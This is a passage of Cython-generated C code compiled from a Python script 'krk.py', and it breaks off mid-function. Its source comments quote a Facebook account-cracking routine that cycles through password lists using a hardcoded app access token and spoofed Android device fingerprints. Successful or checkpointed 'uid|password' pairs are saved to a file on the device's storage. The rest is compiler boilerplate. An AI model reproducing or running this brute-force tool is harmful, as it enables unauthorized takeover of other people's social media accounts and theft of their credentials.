            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __pyx_t_3 = PyNumber_Add(__pyx_t_4, __pyx_kp_s__63); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 668, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_3);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __pyx_t_4 = NULL;
            __pyx_t_7 = 0;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_14))) {
              __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_14);
              if (likely(__pyx_t_4)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_14);
                __Pyx_INCREF(__pyx_t_4);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_14, function);
                __pyx_t_7 = 1;
              }
            }
            {
              PyObject *__pyx_callargs[2] = {__pyx_t_4, __pyx_t_3};
              __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_14, __pyx_callargs+1-__pyx_t_7, 1+__pyx_t_7);
              __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
              __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
              if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 668, __pyx_L3_error)
              __Pyx_GOTREF(__pyx_t_2);
              __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
            }
            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

            /* "krk.py":669
 *                                         print('\r\r\x1b[1;36m [ZEA-CP] '+str(uid)+' | '+pas+'\033[1;97m')
 *                                         open('/sdcard/ZEA-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
 *                                         cps.append(str(ids))             # <<<<<<<<<<<<<<
 *                                         break
 *                         else:continue
 */
            __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_cps); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 669, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_2);
            __pyx_t_14 = __Pyx_PyObject_Str(__pyx_v_ids); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 669, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_14);
            __pyx_t_19 = __Pyx_PyObject_Append(__pyx_t_2, __pyx_t_14); if (unlikely(__pyx_t_19 == ((int)-1))) __PYX_ERR(0, 669, __pyx_L3_error)
            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;

            /* "krk.py":670
 *                                         open('/sdcard/ZEA-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
 *                                         cps.append(str(ids))
 *                                         break             # <<<<<<<<<<<<<<
 *                         else:continue
 *                 loop+=1
 */
            goto __pyx_L10_break;
          }
          __pyx_L33:;

          /* "krk.py":660
 *                                         oks.append(str(uid))
 *                                         break
 *                         elif 'www.facebook.com' in po['error']['message']:             # <<<<<<<<<<<<<<
 *                                 try:
 *                                         uid = po['error']['error_data']['uid']
 */
          goto __pyx_L11;
        }

        /* "krk.py":671
 *                                         cps.append(str(ids))
 *                                         break
 *                         else:continue             # <<<<<<<<<<<<<<
 *                 loop+=1
 *         except Exception as e:
 */
        /*else*/ {
          goto __pyx_L9_continue;
        }
        __pyx_L11:;

        /* "krk.py":589
 *         sys.stdout.write('\r\r\033[1;37m [ZEA-R-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 *         try:
 *                 for pas in passlist:             # <<<<<<<<<<<<<<
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 *                         fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
 */
        __pyx_L9_continue:;
      }
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      goto __pyx_L34_for_end;
      __pyx_L10_break:;
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      goto __pyx_L34_for_end;
      __pyx_L34_for_end:;

      /* "krk.py":672
 *                                         break
 *                         else:continue
 *                 loop+=1             # <<<<<<<<<<<<<<
 *         except Exception as e:
 *                 pass
 */
      __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_loop); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 672, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_14 = __Pyx_PyInt_AddObjC(__pyx_t_1, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 672, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_14);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_loop, __pyx_t_14) < 0) __PYX_ERR(0, 672, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;

      /* "krk.py":588
 *         global oks
 *         sys.stdout.write('\r\r\033[1;37m [ZEA-R-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 *         try:             # <<<<<<<<<<<<<<
 *                 for pas in passlist:
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 */
    }
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;

    /* "krk.py":673
 *                         else:continue
 *                 loop+=1
 *         except Exception as e:             # <<<<<<<<<<<<<<
 *                 pass
 * try:
 */
    __pyx_t_7 = __Pyx_PyErr_ExceptionMatches(((PyObject *)(&((PyTypeObject*)PyExc_Exception)[0])));
    if (__pyx_t_7) {
      __Pyx_AddTraceback("krk.rndm", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_14, &__pyx_t_1, &__pyx_t_2) < 0) __PYX_ERR(0, 673, __pyx_L5_except_error)
      __Pyx_XGOTREF(__pyx_t_14);
      __Pyx_XGOTREF(__pyx_t_1);
      __Pyx_XGOTREF(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_1);
      __pyx_v_e = __pyx_t_1;
      /*try:*/ {
      }
      /*finally:*/ {
        /*normal exit:*/{
          __Pyx_DECREF(__pyx_v_e); __pyx_v_e = 0;
          goto __pyx_L41;
        }
        __pyx_L41:;
      }
      __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;

    /* "krk.py":588
 *         global oks
 *         sys.stdout.write('\r\r\033[1;37m [ZEA-R-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 *         try:             # <<<<<<<<<<<<<<
 *                 for pas in passlist:
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 */
    __pyx_L5_except_error:;
    __Pyx_XGIVEREF(__pyx_t_8);
    __Pyx_XGIVEREF(__pyx_t_9);
    __Pyx_XGIVEREF(__pyx_t_10);
    __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_9, __pyx_t_10);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_8);
    __Pyx_XGIVEREF(__pyx_t_9);
    __Pyx_XGIVEREF(__pyx_t_10);
    __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_9, __pyx_t_10);
    __pyx_L8_try_end:;
  }

  /* "krk.py":584
 *         except Exception as e:
 *                 pass
 * def rndm(ids,passlist):             # <<<<<<<<<<<<<<
 *         global loop
 *         global oks
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_14);
  __Pyx_AddTraceback("krk.rndm", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_pas);
  __Pyx_XDECREF(__pyx_v_accessToken);
  __Pyx_XDECREF(__pyx_v_fbav);
  __Pyx_XDECREF(__pyx_v_fbbv);
  __Pyx_XDECREF(__pyx_v_android_version);
  __Pyx_XDECREF(__pyx_v_model);
  __Pyx_XDECREF(__pyx_v_build);
  __Pyx_XDECREF(__pyx_v_fblc);
  __Pyx_XDECREF(__pyx_v_fbcr);
  __Pyx_XDECREF(__pyx_v_fbmf);
  __Pyx_XDECREF(__pyx_v_fbbd);
  __Pyx_XDECREF(__pyx_v_fbdv);
  __Pyx_XDECREF(__pyx_v_fbsv);
  __Pyx_XDECREF(__pyx_v_fbca);
  __Pyx_XDECREF(__pyx_v_fbdm);
  __Pyx_XDECREF(__pyx_v_fbfw);
  __Pyx_XDECREF(__pyx_v_fbrv);
  __Pyx_XDECREF(__pyx_v_fban);
  __Pyx_XDECREF(__pyx_v_fbpn);
  __Pyx_XDECREF(__pyx_v_ua);
  __Pyx_XDECREF(__pyx_v_random_seed);
  __Pyx_XDECREF(__pyx_v_adid);
  __Pyx_XDECREF(__pyx_v_device_id);
  __Pyx_XDECREF(__pyx_v_secure);
  __Pyx_XDECREF(__pyx_v_family);
  __Pyx_XDECREF(__pyx_v_xd);
  __Pyx_XDECREF(__pyx_v_sim_serials);
  __Pyx_XDECREF(__pyx_v_li);
  __Pyx_XDECREF(__pyx_v_li2);
  __Pyx_XDECREF(__pyx_v_j1);
  __Pyx_XDECREF(__pyx_v_jazoest);
  __Pyx_XDECREF(__pyx_v_data);
  __Pyx_XDECREF(__pyx_v_headers);
  __Pyx_XDECREF(__pyx_v_url);
  __Pyx_XDECREF(__pyx_v_twf);
  __Pyx_XDECREF(__pyx_v_po);
  __Pyx_XDECREF(__pyx_v_uid);
  __Pyx_XDECREF(__pyx_v_e);
  __Pyx_XDECREF(__pyx_gb_3krk_4rndm_2generator6);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static struct __pyx_obj_3krk___pyx_scope_struct__genexpr *__pyx_freelist_3krk___pyx_scope_struct__genexpr[8];
static int __pyx_freecount_3krk___pyx_scope_struct__genexpr = 0;

static PyObject *__pyx_tp_new_3krk___pyx_scope_struct__genexpr(PyTypeObject *t, CYTHON_UNUSED PyObject *a, CYTHON_UNUSED PyObject *k) {
  PyObject *o;
  #if CYTHON_COMPILING_IN_LIMITED_API
  allocfunc alloc_func = (allocfunc)PyType_GetSlot(t, Py_tp_alloc);
  o = alloc_func(t, 0);
  #else
  if (CYTHON_COMPILING_IN_CPYTHON && likely((int)(__pyx_freecount_3krk___pyx_scope_struct__genexpr > 0) & (int)(t->tp_basicsize == sizeof(struct __pyx_obj_3krk___pyx_scope_struct__genexpr)))) {
    o = (PyObject*)__pyx_freelist_3krk___pyx_scope_struct__genexpr[--__pyx_freecount_3krk___pyx_scope_struct__genexpr];
    memset(o, 0, sizeof(struct __pyx_obj_3krk___pyx_scope_struct__genexpr));
    (void) PyObject_INIT(o, t);
  } else {
    o = (*t->tp_alloc)(t, 0);
    if (unlikely(!o)) return 0;
  }
  #endif
  return o;
}

static void __pyx_tp_dealloc_3krk___pyx_scope_struct__genexpr(PyObject *o) {
  #if CYTHON_USE_TP_FINALIZE
  if (unlikely((PY_VERSION_HEX >= 0x03080000 || __Pyx_PyType_HasFeature(Py_TYPE(o), Py_TPFLAGS_HAVE_FINALIZE)) && __Pyx_PyObject_GetSlot(o, tp_finalize, destructor)) && (!PyType_IS_GC(Py_TYPE(o)) || !__Pyx_PyObject_GC_IsFinalized(o))) {
    if (__Pyx_PyObject_GetSlot(o, tp_dealloc, destructor) == __pyx_tp_dealloc_3krk___pyx_scope_struct__genexpr) {
      if (PyObject_CallFinalizerFromDealloc(o)) return;
    }
  }
  #endif
  if (CYTHON_COMPILING_IN_CPYTHON && ((int)(__pyx_freecount_3krk___pyx_scope_struct__genexpr < 8) & (int)(Py_TYPE(o)->tp_basicsize == sizeof(struct __pyx_obj_3krk___pyx_scope_struct__genexpr)))) {
    __pyx_freelist_3krk___pyx_scope_struct__genexpr[__pyx_freecount_3krk___pyx_scope_struct__genexpr++] = ((struct __pyx_obj_3krk___pyx_scope_struct__genexpr *)o);
  } else {
    (*Py_TYPE(o)->tp_free)(o);
  }
}
#if CYTHON_USE_TYPE_SPECS
static PyType_Slot __pyx_type_3krk___pyx_scope_struct__genexpr_slots[] = {
  {Py_tp_dealloc, (void *)__pyx_tp_dealloc_3krk___pyx_scope_struct__genexpr},
  {Py_tp_new, (void *)__pyx_tp_new_3krk___pyx_scope_struct__genexpr},
  {0, 0},
};
static PyType_Spec __pyx_type_3krk___pyx_scope_struct__genexpr_spec = {
  "krk.__pyx_scope_struct__genexpr",
  sizeof(struct __pyx_obj_3krk___pyx_scope_struct__genexpr),
  0,
  Py_TPFLAGS_DEFAULT|Py_TPFLAGS_HAVE_VERSION_TAG|Py_TPFLAGS_CHECKTYPES|Py_TPFLAGS_HAVE_NEWBUFFER|Py_TPFLAGS_HAVE_FINALIZE,
  __pyx_type_3krk___pyx_scope_struct__genexpr_slots,
};
#else

static PyTypeObject __pyx_type_3krk___pyx_scope_struct__genexpr = {
  PyVarObject_HEAD_INIT(0, 0)
  "krk.""__pyx_scope_struct__genexpr", /*tp_name*/
  sizeof(struct __pyx_obj_3krk___pyx_scope_struct__genexpr), /*tp_basicsize*/
  0, /*tp_itemsize*/
  __pyx_tp_dealloc_3krk___pyx_scope_struct__genexpr, /*tp_dealloc*/
  #if PY_VERSION_HEX < 0x030800b4
  0, /*tp_print*/
  #endif
  #if PY_VERSION_HEX >= 0x030800b4
  0, /*tp_vectorcall_offset*/
  #endif
  0, /*tp_getattr*/
  0, /*tp_setattr*/
  #if PY_MAJOR_VERSION < 3
  0, /*tp_compare*/
  #endif
  #if PY_MAJOR_VERSION >= 3
  0, /*tp_as_async*/
  #endif
  0, /*tp_repr*/
  0, /*tp_as_number*/
  0, /*tp_as_sequence*/
  0, /*tp_as_mapping*/
  0, /*tp_hash*/
  0, /*tp_call*/
  0, /*tp_str*/
  0, /*tp_getattro*/
  0, /*tp_setattro*/
  0, /*tp_as_buffer*/
  Py_TPFLAGS_DEFAULT|Py_TPFLAGS_HAVE_VERSION_TAG|Py_TPFLAGS_CHECKTYPES|Py_TPFLAGS_HAVE_NEWBUFFER|Py_TPFLAGS_HAVE_FINALIZE, /*tp_flags*/
  0, /*tp_doc*/
  0, /*tp_traverse*/
  0, /*tp_clear*/
  0, /*tp_richcompare*/
  0, /*tp_weaklistoffset*/
  0, /*tp_iter*/
  0, /*tp_iternext*/
  0, /*tp_methods*/
  0, /*tp_members*/
  0, /*tp_getset*/
  0, /*tp_base*/
  0, /*tp_dict*/
  0, /*tp_descr_get*/
  0, /*tp_descr_set*/
  #if !CYTHON_USE_TYPE_SPECS
  0, /*tp_dictoffset*/
  #endif
  0, /*tp_init*/
  0, /*tp_alloc*/
  __pyx_tp_new_3krk___pyx_scope_struct__genexpr, /*tp_new*/
  0, /*tp_free*/
  0, /*tp_is_gc*/
  0, /*tp_bases*/
  0, /*tp_mro*/
  0, /*tp_cache*/
  0, /*tp_subclasses*/
  0, /*tp_weaklist*/
  0, /*tp_del*/
  0, /*tp_version_tag*/
  #if PY_VERSION_HEX >= 0x030400a1
  #if CYTHON_USE_TP_FINALIZE
  0, /*tp_finalize*/
  #else
  NULL, /*tp_finalize*/
  #endif
  #endif
  #if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
  0, /*tp_vectorcall*/
  #endif
  #if __PYX_NEED_TP_PRINT_SLOT == 1
  0, /*tp_print*/
  #endif
  #if PY_VERSION_HEX >= 0x030C0000
  0, /*tp_watched*/
  #endif
  #if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000 && PY_VERSION_HEX < 0x030a0000
  0, /*tp_pypy_flags*/
  #endif
};
#endif

static struct __pyx_obj_3krk___pyx_scope_struct_1_genexpr *__pyx_freelist_3krk___pyx_scope_struct_1_genexpr[8];
static int __pyx_freecount_3krk___pyx_scope_struct_1_genexpr = 0;

static PyObject *__pyx_tp_new_3krk___pyx_scope_struct_1_genexpr(PyTypeObject *t, CYTHON_UNUSED PyObject *a, CYTHON_UNUSED PyObject *k) {
  PyObject *o;
  #if CYTHON_COMPILING_IN_LIMITED_API
  allocfunc alloc_func = (allocfunc)PyType_GetSlot(t, Py_tp_alloc);
  o = alloc_func(t, 0);
  #else
  if (CYTHON_COMPILING_IN_CPYTHON && likely((int)(__pyx_freecount_3krk___pyx_scope_struct_1_genexpr > 0) & (int)(t->tp_basicsize == sizeof(struct __pyx_obj_3krk___pyx_scope_struct_1_genexpr)))) {
    o = (PyObject*)__pyx_freelist_3krk___pyx_scope_struct_1_genexpr[--__pyx_freecount_3krk___pyx_scope_struct_1_genexpr];
    memset(o, 0, sizeof(struct __pyx_obj_3krk___pyx_scope_struct_1_genexpr));
    (void) PyObject_INIT(o, t);
  } else {
    o = (*t->tp_alloc)(t, 0);
    if (unlikely(!o)) return 0;
  }
  #endif
  return o;
}

static void __pyx_tp_dealloc_3krk___pyx_scope_struct_1_genexpr(PyObject *o) {
  #if CYTHON_USE_TP_FINALIZE
  if (unlikely((PY_VERSION_HEX >= 0x03080000 || __Pyx_PyType_HasFeature(Py_TYPE(o), Py_TPFLAGS_HAVE_FINALIZE)) && __Pyx_PyObject_GetSlot(o, tp_finalize, destructor)) && (!PyType_IS_GC(Py_TYPE(o)) || !__Pyx_PyObject_GC_IsFinalized(o))) {
    if (__Pyx_PyObject_GetSlot(o, tp_dealloc, destructor) == __pyx_tp_dealloc_3krk___pyx_scope_struct_1_genexpr) {
      if (PyObject_CallFinalizerFromDealloc(o)) return;
    }
  }
  #endif
  if (CYTHON_COMPILING_IN_CPYTHON && ((int)(__pyx_freecount_3krk___pyx_scope_struct_1_genexpr < 8) & (int)(Py_TYPE(o)->tp_basicsize == sizeof(struct __pyx_obj_3krk___pyx_scope_struct_1_genexpr)))) {
    __pyx_freelist_3krk___pyx_scope_struct_1_genexpr[__pyx_freecount_3krk___pyx_scope_struct_1_genexpr++] = ((struct __pyx_obj_3krk___pyx_scope_struct_1_genexpr *)o);
  } else {
    (*Py_TYPE(o)->tp_free)(o);
  }
}
#if CYTHON_USE_TYPE_SPECS
static PyType_Slot __pyx_type_3krk___pyx_scope_struct_1_genexpr_slots[] = {
  {Py_tp_dealloc, (void *)__pyx_tp_dealloc_3krk___pyx_scope_struct_1_genexpr},
  {Py_tp_new, (void *)__pyx_tp_new_3krk___pyx_scope_struct_1_genexpr},
  {0, 0},
};
static PyType_Spec __pyx_type_3krk___pyx_scope_struct_1_genexpr_spec = {
  "krk.__pyx_scope_struct_1_genexpr",
  sizeof(struct __pyx_obj_3krk___pyx_scope_struct_1_genexpr),
  0,
  Py_TPFLAGS_DEFAULT|Py_TPFLAGS_HAVE_VERSION_TAG|Py_TPFLAGS_CHECKTYPES|Py_TPFLAGS_HAVE_NEWBUFFER|Py_TPFLAGS_HAVE_FINALIZE,
  __pyx_type_3krk___pyx_scope_struct_1_genexpr_slots,
};
#else

static PyTypeObject __pyx_type_3krk___pyx_scope_struct_1_genexpr = {
  PyVarObject_HEAD_INIT(0, 0)
  "krk.""__pyx_scope_struct_1_genexpr", /*tp_name*/
  sizeof(struct __pyx_obj_3krk___pyx_scope_struct_1_genexpr), /*tp_basicsize*/
  0, /*tp_itemsize*/
  __pyx_tp_dealloc_3krk___pyx_scope_struct_1_genexpr, /*tp_dealloc*/
  #if PY_VERSION_HEX < 0x030800b4
  0, /*tp_print*/
  #endif
  #if PY_VERSION_HEX >= 0x030800b4
  0, /*tp_vectorcall_offset*/
  #endif
  0, /*tp_getattr*/
  0, /*tp_setattr*/
  #if PY_MAJOR_VERSION < 3
  0, /*tp_compare*/
  #endif
  #if PY_MAJOR_VERSION >= 3
  0, /*tp_as_async*/
  #endif
  0, /*tp_repr*/
  0, /*tp_as_number*/
  0, /*tp_as_sequence*/
  0, /*tp_as_mapping*/
  0, /*tp_hash*/
  0, /*tp_call*/
  0, /*tp_str*/
  0, /*tp_getattro*/
  0, /*tp_setattro*/
  0, /*tp_as_buffer*/
  Py_TPFLAGS_DEFAULT|Py_TPFLAGS_HAVE_VERSION_TAG|Py_TPFLAGS_CHECKTYPES|Py_TPFLAGS_HAVE_NEWBUFFER|Py_TPFLAGS_HAVE_FINALIZE, /*tp_flags*/
  0, /*tp_doc*/
  0, /*tp_traverse*/
  0, /*tp_clear*/
  0, /*tp_richcompare*/
  0, /*tp_weaklistoffset*/
  0, /*tp_iter*/
  0, /*tp_iternext*/
  0, /*tp_methods*/
  0, /*tp_members*/
  0, /*tp_getset*/
  0, /*tp_base*/
  0, /*tp_dict*/
  0, /*tp_descr_get*/
  0, /*tp_descr_set*/
  #if !CYTHON_USE_TYPE_SPECS
  0, /*tp_dictoffset*/
  #endif
  0, /*tp_init*/
  0, /*tp_alloc*/
  __pyx_tp_new_3krk___pyx_scope_struct_1_genexpr, /*tp_new*/
  0, /*tp_free*/
  0, /*tp_is_gc*/
  0, /*tp_bases*/
  0, /*tp_mro*/
  0, /*tp_cache*/
  0, /*tp_subclasses*/
  0, /*tp_weaklist*/
  0, /*tp_del*/
  0, /*tp_version_tag*/
  #if PY_VERSION_HEX >= 0x030400a1
  #if CYTHON_USE_TP_FINALIZE
  0, /*tp_finalize*/
  #else
  NULL, /*tp_finalize*/
  #endif
  #endif
  #if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
  0, /*tp_vectorcall*/
  #endif
  #if __PYX_NEED_TP_PRINT_SLOT == 1
  0, /*tp_print*/
  #endif
  #if PY_VERSION_HEX >= 0x030C0000
  0, /*tp_watched*/
  #endif
  #if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000 && PY_VERSION_HEX < 0x030a0000
  0, /*tp_pypy_flags*/
  #endif
};
#endif

static struct __pyx_obj_3krk___pyx_scope_struct_2_genexpr *__pyx_freelist_3krk___pyx_scope_struct_2_genexpr[8];
static int __pyx_freecount_3krk___pyx_scope_struct_2_genexpr = 0;

static PyObject *__pyx_tp_new_3krk___pyx_scope_struct_2_genexpr(PyTypeObject *t, CYTHON_UNUSED PyObject *a, CYTHON_UNUSED PyObject *k) {
  PyObject *o;
  #if CYTHON_COMPILING_IN_LIMITED_API
  allocfunc alloc_func = (allocfunc)PyType_GetSlot(t, Py_tp_alloc);
  o = alloc_func(t, 0);
  #else
  if (CYTHON_COMPILING_IN_CPYTHON && likely((int)(__pyx_freecount_3krk___pyx_scope_struct_2_genexpr > 0) & (int)(t->tp_basicsize == sizeof(struct __pyx_obj_3krk___pyx_scope_struct_2_genexpr)))) {
    o = (PyObject*)__pyx_freelist_3krk___pyx_scope_struct_2_genexpr[--__pyx_freecount_3krk___pyx_scope_struct_2_genexpr];
    memset(o, 0, sizeof(struct __pyx_obj_3krk___pyx_scope_struct_2_genexpr));
    (void) PyObject_INIT(o, t);
  } else {
    o = (*t->tp_alloc)(t, 0);
    if (unlikely(!o)) return 0;
  }
  #endif
  return o;
}

static void __pyx_tp_dealloc_3krk___pyx_scope_struct_2_genexpr(PyObject *o) {
  #if CYTHON_USE_TP_FINALIZE
  if (unlikely((PY_VERSION_HEX >= 0x03080000 || __Pyx_PyType_HasFeature(Py_TYPE(o), Py_TPFLAGS_HAVE_FINALIZE)) && __Pyx_PyObject_GetSlot(o, tp_finalize, destructor)) && (!PyType_IS_GC(Py_TYPE(o)) || !__Pyx_PyObject_GC_IsFinalized(o))) {
    if (__Pyx_PyObject_GetSlot(o, tp_dealloc, destructor) == __pyx_tp_dealloc_3krk___pyx_scope_struct_2_genexpr) {
      if (PyObject_CallFinalizerFromDealloc(o)) return;
    }
  }
  #endif
  if (CYTHON_COMPILING_IN_CPYTHON && ((int)(__pyx_freecount_3krk___pyx_scope_struct_2_genexpr < 8) & (int)(Py_TYPE(o)->tp_basicsize == sizeof(struct __pyx_obj_3krk___pyx_scope_struct_2_genexpr)))) {
    __pyx_freelist_3krk___pyx_scope_struct_2_genexpr[__pyx_freecount_3krk___pyx_scope_struct_2_genexpr++] = ((struct __pyx_obj_3krk___pyx_scope_struct_2_genexpr *)o);
  } else {
    (*Py_TYPE(o)->tp_free)(o);
  }
}
#if CYTHON_USE_TYPE_SPECS
static PyType_Slot __pyx_type_3krk___pyx_scope_struct_2_genexpr_slots[] = {
  {Py_tp_dealloc, (void *)__pyx_tp_dealloc_3krk___pyx_scope_struct_2_genexpr},
  {Py_tp_new, (void *)__pyx_tp_new_3krk___pyx_scope_struct_2_genexpr},
  {0, 0},
};
static PyType_Spec __pyx_type_3krk___pyx_scope_struct_2_genexpr_spec = {
  "krk.__pyx_scope_struct_2_genexpr",
  sizeof(struct __pyx_obj_3krk___pyx_scope_struct_2_genexpr),
  0,
  Py_TPFLAGS_DEFAULT|Py_TPFLAGS_HAVE_VERSION_TAG|Py_TPFLAGS_CHECKTYPES|Py_TPFLAGS_HAVE_NEWBUFFER|Py_TPFLAGS_HAVE_FINALIZE,
  __pyx_type_3krk___pyx_scope_struct_2_genexpr_slots,
};
#else

static PyTypeObject __pyx_type_3krk___pyx_scope_struct_2_genexpr = {
  PyVarObject_HEAD_INIT(0, 0)
  "krk.""__pyx_scope_struct_2_genexpr", /*tp_name*/
  sizeof(struct __pyx_obj_3krk___pyx_scope_struct_2_genexpr), /*tp_basicsize*/
  0, /*tp_itemsize*/
  __pyx_tp_dealloc_3krk___pyx_scope_struct_2_genexpr, /*tp_dealloc*/
  #if PY_VERSION_HEX < 0x030800b4
  0, /*tp_print*/
  #endif
  #if PY_VERSION_HEX >= 0x030800b4
  0, /*tp_vectorcall_offset*/
  #endif
  0, /*tp_getattr*/
  0, /*tp_setattr*/
  #if PY_MAJOR_VERSION < 3
  0, /*tp_compare*/
  #endif
  #if PY_MAJOR_VERSION >= 3
  0, /*tp_as_async*/
  #endif
  0, /*tp_repr*/
  0, /*tp_as_number*/
  0, /*tp_as_sequence*/
  0, /*tp_as_mapping*/
  0, /*tp_hash*/
  0, /*tp_call*/
  0, /*tp_str*/
  0, /*tp_getattro*/
  0, /*tp_setattro*/
  0, /*tp_as_buffer*/
  Py_TPFLAGS_DEFAULT|Py_TPFLAGS_HAVE_VERSION_TAG|Py_TPFLAGS_CHECKTYPES|Py_TPFLAGS_HAVE_NEWBUFFER|Py_TPFLAGS_HAVE_FINALIZE, /*tp_flags*/
  0, /*tp_doc*/
  0, /*tp_traverse*/
  0, /*tp_clear*/
  0, /*tp_richcompare*/
  0, /*tp_weaklistoffset*/
  0, /*tp_iter*/
  0, /*tp_iternext*/
  0, /*tp_methods*/
  0, /*tp_members*/
  0, /*tp_getset*/
  0, /*tp_base*/
  0, /*tp_dict*/
  0, /*tp_descr_get*/
  0, /*tp_descr_set*/
  #if !CYTHON_USE_TYPE_SPECS
  0, /*tp_dictoffset*/
  #endif
  0, /*tp_init*/
  0, /*tp_alloc*/
  __pyx_tp_new_3krk___pyx_scope_struct_2_genexpr, /*tp_new*/
  0, /*tp_free*/
  0, /*tp_is_gc*/
  0, /*tp_bases*/
  0, /*tp_mro*/
  0, /*tp_cache*/
  0, /*tp_subclasses*/
  0, /*tp_weaklist*/
  0, /*tp_del*/
  0, /*tp_version_tag*/
  #if PY_VERSION_HEX >= 0x030400a1
  #if CYTHON_USE_TP_FINALIZE
  0, /*tp_finalize*/
  #else
  NULL, /*tp_finalize*/
  #endif
  #endif
  #if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
  0, /*tp_vectorcall*/
  #endif
  #if __PYX_NEED_TP_PRINT_SLOT == 1
  0, /*tp_print*/
  #endif
  #if PY_VERSION_HEX >= 0x030C0000
  0, /*tp_watched*/
  #endif
  #if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000 && PY_VERSION_HEX < 0x030a0000
  0, /*tp_pypy_flags*/
  #endif
};
#endif

static struct __pyx_obj_3krk___pyx_scope_struct_3_genexpr *__pyx_freelist_3krk___pyx_scope_struct_3_genexpr[8];
static int __pyx_freecount_3krk___pyx_scope_struct_3_genexpr = 0;

static PyObject *__pyx_tp_new_3krk___pyx_scope_struct_3_genexpr(PyTypeObject *t, CYTHON_UNUSED PyObject *a, CYTHON_UNUSED PyObject *k) {
  PyObject *o;
  #if CYTHON_COMPILING_IN_LIMITED_API
  allocfunc alloc_func = (allocfunc)PyType_GetSlot(t, Py_tp_alloc);
  o = alloc_func(t, 0);
  #else
